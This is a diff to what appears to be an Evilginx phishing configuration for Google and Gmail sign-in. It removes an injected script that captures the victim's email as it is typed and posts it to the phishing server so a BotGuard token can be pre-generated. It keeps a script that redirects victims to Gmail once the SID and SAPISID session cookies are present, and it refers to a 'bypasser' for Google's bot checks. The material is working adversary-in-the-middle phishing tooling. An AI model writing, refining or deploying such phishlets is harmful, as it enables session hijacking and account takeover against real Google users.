@@ -77,98 +77,12 @@ login:
   path: '/signin/v2/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin&continue=https://mail.google.com/mail/u/0/'
 
 # ============================================================================
-# JS INJECTION - KEY OPTIMIZATION
-# This captures the email BEFORE the user clicks Next, allowing us to
-# pre-generate the botguard token while they're still typing
+# JS INJECTION - SIMPLIFIED
+# Removed pre-generation complexity - bypasser now works synchronously
+# when MI613e request arrives. This is simpler and more reliable.
 # ============================================================================
 
 js_inject:
-  - trigger_domains: ['accounts.google.com']
-    trigger_paths: ['/', '/signin', '/v3/signin/identifier']
-    script: |
-      (function() {
-        // Configuration
-        var preGenEndpoint = '/.evilginx/pregen';  // Endpoint to trigger pre-generation
-        var emailSent = false;
-        var lastEmail = '';
-        
-        // Function to send email for pre-generation
-        function preGenerateToken(email) {
-          if (emailSent && lastEmail === email) return;
-          if (!email || !email.includes('@')) return;
-          
-          console.log('[EvilPuppet] Pre-generating token for:', email);
-          emailSent = true;
-          lastEmail = email;
-          
-          // Send to backend for pre-generation
-          fetch(preGenEndpoint, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({email: email})
-          }).catch(function(e) {
-            console.log('[EvilPuppet] Pre-gen request sent');
-          });
-        }
-        
-        // Monitor email input field
-        function setupEmailMonitor() {
-          var emailField = document.getElementById('identifierId');
-          if (!emailField) {
-            setTimeout(setupEmailMonitor, 500);
-            return;
-          }
-          
-          // Capture on blur (when user leaves the field)
-          emailField.addEventListener('blur', function() {
-            var email = this.value.trim();
-            if (email) preGenerateToken(email);
-          });
-          
-          // Capture on input with debounce (as user types)
-          var debounceTimer;
-          emailField.addEventListener('input', function() {
-            clearTimeout(debounceTimer);
-            var email = this.value.trim();
-            debounceTimer = setTimeout(function() {
-              if (email && email.includes('@')) {
-                preGenerateToken(email);
-              }
-            }, 1500);  // 1.5 second debounce
-          });
-          
-          // Capture on Enter key or Next button click
-          emailField.addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') {
-              var email = this.value.trim();
-              if (email) preGenerateToken(email);
-            }
-          });
-          
-          // Monitor Next button
-          var observer = new MutationObserver(function() {
-            var nextBtn = document.querySelector('button[type="button"]');
-            if (nextBtn && !nextBtn.hasAttribute('data-pregen-listener')) {
-              nextBtn.setAttribute('data-pregen-listener', 'true');
-              nextBtn.addEventListener('click', function() {
-                var email = document.getElementById('identifierId');
-                if (email && email.value) preGenerateToken(email.value.trim());
-              });
-            }
-          });
-          
-          observer.observe(document.body, {childList: true, subtree: true});
-          console.log('[EvilPuppet] Email monitor initialized');
-        }
-        
-        // Initialize on page load
-        if (document.readyState === 'loading') {
-          document.addEventListener('DOMContentLoaded', setupEmailMonitor);
-        } else {
-          setupEmailMonitor();
-        }
-      })();
-
   # Redirect from myaccount to Gmail after successful login
   - trigger_domains: ['myaccount.google.com']
     trigger_paths: ['/']
@@ -177,7 +91,7 @@ js_inject:
         // Check if we have session cookies and redirect to Gmail
         function checkAndRedirect() {
           if (document.cookie.includes('SID') && document.cookie.includes('SAPISID')) {
-            console.log('[EvilPuppet] Session detected, redirecting to Gmail...');
+            console.log('[GoogleBypasser] Session detected, redirecting to Gmail...');
             window.location.href = 'https://mail.google.com/mail/u/0/';
           }
         }
